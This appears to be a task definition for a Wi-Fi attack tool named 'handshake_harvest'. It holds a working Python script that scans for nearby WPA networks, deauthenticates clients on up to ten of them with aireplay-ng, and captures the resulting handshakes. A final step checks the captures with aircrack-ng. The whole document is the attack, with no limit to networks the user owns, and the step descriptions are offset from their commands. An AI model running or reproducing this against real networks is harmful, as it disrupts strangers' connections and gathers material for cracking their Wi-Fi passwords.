name: handshake_harvest
description: Mass handshake harvesting: cycle through all nearby WPA networks, deauth each, and collect handshakes into a single directory.
author: james-linux

steps.description: Scan all channels for 20 seconds to discover targets

params.command:
python3 -c "
import csv, subprocess, time, os, sys
csv_file = '/tmp/james_harvest_scan-01.csv'
if not os.path.exists(csv_file):
    print('No scan results found'); sys.exit(1)

targets = []
with open(csv_file, 'r', errors='ignore') as f:
    section = 0
    for line in f:
        line = line.strip()
        if line.startswith('BSSID,'): section = 1; continue
        if line.startswith('Station MAC,'): break
        if section == 1 and line:
            parts = [p.strip() for p in line.split(',')]
            if len(parts) >= 14 and 'WPA' in parts[5]:
                try: pwr = int(parts[8])
                except: pwr = -100
                if pwr > -80:
                    targets.append({'bssid': parts[0], 'ch': parts[3], 'essid': parts[13]})

print(f'Found {len(targets)} WPA targets with strong signal')
for i, t in enumerate(targets[:10]):
    print(f'  [{i+1}] Targeting {t[\"bssid\"]} ({t[\"essid\"]}) ch {t[\"ch\"]}')
    prefix = f'/tmp/james_harvested/cap_{i}'
    cap = subprocess.Popen(f'airodump-ng --channel {t[\"ch\"]} --bssid {t[\"bssid\"]} -w {prefix} {{monitor_interface}}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    subprocess.run(f'aireplay-ng -0 5 -a {t[\"bssid\"]} {{monitor_interface}}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(8)
    cap.terminate()
    cap.wait()
print(f'Harvest complete. Captures saved to /tmp/james_harvested/')
"

steps.description: Cycle through strong-signal WPA targets, deauth each, and save captures

params.command: echo '=== CAPTURED FILES ===' && ls -la /tmp/james_harvested/*.cap 2>/dev/null && echo '' && for f in /tmp/james_harvested/*.cap; do echo "--- $f ---" && aircrack-ng $f 2>/dev/null | grep -E 'handshake|WPA' | head -3; done

steps.description: Verify which captures contain valid handshakes
